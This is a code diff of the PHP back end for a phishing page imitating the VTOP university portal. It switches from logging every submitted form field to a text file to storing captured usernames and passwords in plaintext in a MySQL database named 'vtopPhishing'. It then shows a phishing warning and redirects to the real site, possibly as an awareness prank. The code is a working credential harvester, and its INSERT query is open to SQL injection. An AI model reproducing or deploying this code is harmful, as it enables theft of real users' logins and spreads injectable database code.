@@ -1,14 +1,10 @@
 <?php
-$handle=fopen("log.txt","a");
-foreach($_POST as $variable => $value)
-{
-	fwrite ($handle,$variable);
-	fwrite ($handle,"=");
-	fwrite ($handle,$value);
-	fwrite ($handle,"\r\n");
-}
-fwrite($handle, "\r\n\n\n\n");
-fclose($handle);
-echo "<script> if (confirm('Beware of Phishing, Change your VTOP Password ASAP!!')) {window.location = 'https://vtop.vit.ac.in/';} </script>";
+$conn=mysqli_connect("localhost","root","","vtopPhishing");
+$uname=$_POST["uname"];
+$passwd = $_POST["passwd"];
+$sql = "INSERT INTO `Login Details`(`Username`, `Password`) VALUES ('$uname','$passwd')";
+mysqli_query($conn,$sql);
+
+echo "<script>if (confirm('Beware of Phishing, Change your VTOP Password ASAP!!')) {window.location = 'https://vtop.vit.ac.in/';} </script>";
 exit;
 ?>
